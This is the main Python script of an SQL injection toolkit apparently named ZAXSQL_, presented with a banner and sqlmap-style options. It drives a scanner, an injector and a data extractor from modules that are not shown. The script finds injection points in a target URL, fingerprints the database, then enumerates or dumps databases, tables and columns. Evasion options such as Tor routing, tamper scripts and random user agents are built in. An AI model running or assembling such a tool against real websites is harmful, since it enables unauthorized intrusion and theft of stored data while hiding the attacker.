#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ZAXSQL_ - SQL Injection Toolkit
Author: zaxsql_
"""

import sys
import argparse
from core.scanner import SQLiScanner
from core.injector import SQLiInjector
from core.extractor import DataExtractor
from utils.colors import Colors
from utils.logger import Logger

def banner():
    print(f"""{Colors.CYAN}
    ███████╗ █████╗ ██╗  ██╗███████╗ ██████╗ ██╗     
    ╚══███╔╝██╔══██╗╚██╗██╔╝██╔════╝██╔═══██╗██║     
      ███╔╝ ███████║ ╚███╔╝ ███████╗██║   ██║██║     
     ███╔╝  ██╔══██║ ██╔██╗ ╚════██║██║▄▄ ██║██║     
    ███████╗██║  ██║██╔╝ ██╗███████║╚██████╔╝███████╗
    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚══▀▀═╝ ╚══════╝
                    v2.0 - By zaxsql_
    {Colors.END}""")

def main():
    banner()
    parser = argparse.ArgumentParser(description="ZAXSQL_ - Advanced SQL Injection Toolkit")
    
    parser.add_argument("-u", "--url", help="Target URL", required=False)
    parser.add_argument("--data", help="POST data", default=None)
    parser.add_argument("--cookie", help="Cookies", default=None)
    parser.add_argument("--headers", help="Custom headers (file or string)", default=None)
    parser.add_argument("--proxy", help="Proxy (http://127.0.0.1:8080)", default=None)
    parser.add_argument("--threads", help="Number of threads", type=int, default=10)
    parser.add_argument("--timeout", help="Request timeout", type=int, default=10)
    parser.add_argument("--level", help="Scan level (1-5)", type=int, default=1)
    parser.add_argument("--risk", help="Risk level (1-3)", type=int, default=1)
    parser.add_argument("--dbms", help="DBMS type (mysql/mssql/postgres/oracle)", default=None)
    parser.add_argument("--dump", help="Dump database", action="store_true")
    parser.add_argument("--dbs", help="Enumerate databases", action="store_true")
    parser.add_argument("--tables", help="Enumerate tables", action="store_true")
    parser.add_argument("--columns", help="Enumerate columns", action="store_true")
    parser.add_argument("--batch", help="Non-interactive mode", action="store_true")
    parser.add_argument("--tamper", help="Tamper script", default=None)
    parser.add_argument("--random-agent", help="Random User-Agent", action="store_true")
    parser.add_argument("--tor", help="Use Tor proxy", action="store_true")
    
    args = parser.parse_args()
    
    if not args.url and not args.batch:
        parser.print_help()
        sys.exit(1)
    
    logger = Logger()
    logger.log(f"Target: {args.url}")
    
    # Initialize scanner
    scanner = SQLiScanner(
        url=args.url,
        data=args.data,
        cookies=args.cookie,
        headers=args.headers,
        proxy=args.proxy,
        timeout=args.timeout,
        level=args.level,
        risk=args.risk,
        random_agent=args.random_agent,
        tor=args.tor
    )
    
    # Scan for vulnerabilities
    vulns = scanner.scan()
    
    if not vulns:
        print(f"{Colors.RED}[!] No SQLi vulnerability detected{Colors.END}")
        sys.exit(0)
    
    print(f"{Colors.GREEN}[+] Found {len(vulns)} potential injection point(s){Colors.END}")
    
    # Initialize injector
    injector = SQLiInjector(
        vuln=vulns[0],
        dbms=args.dbms,
        tamper=args.tamper,
        threads=args.threads
    )
    
    # Determine DBMS if not specified
    if not args.dbms:
        args.dbms = injector.detect_dbms()
        print(f"{Colors.GREEN}[+] Detected DBMS: {args.dbms}{Colors.END}")
    
    # Extract data based on flags
    extractor = DataExtractor(injector)
    
    if args.dbs:
        dbs = extractor.get_databases()
        print(f"\n{Colors.YELLOW}[*] Databases:{Colors.END}")
        for db in dbs:
            print(f"    [+] {db}")
    
    if args.tables:
        tables = extractor.get_tables()
        print(f"\n{Colors.YELLOW}[*] Tables:{Colors.END}")
        for table in tables:
            print(f"    [+] {table}")
    
    if args.columns:
        columns = extractor.get_columns()
        print(f"\n{Colors.YELLOW}[*] Columns:{Colors.END}")
        for col in columns:
            print(f"    [+] {col}")
    
    if args.dump:
        print(f"\n{Colors.YELLOW}[*] Dumping data...{Colors.END}")
        extractor.dump_all()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Interrupted by user{Colors.END}")
        sys.exit(0)
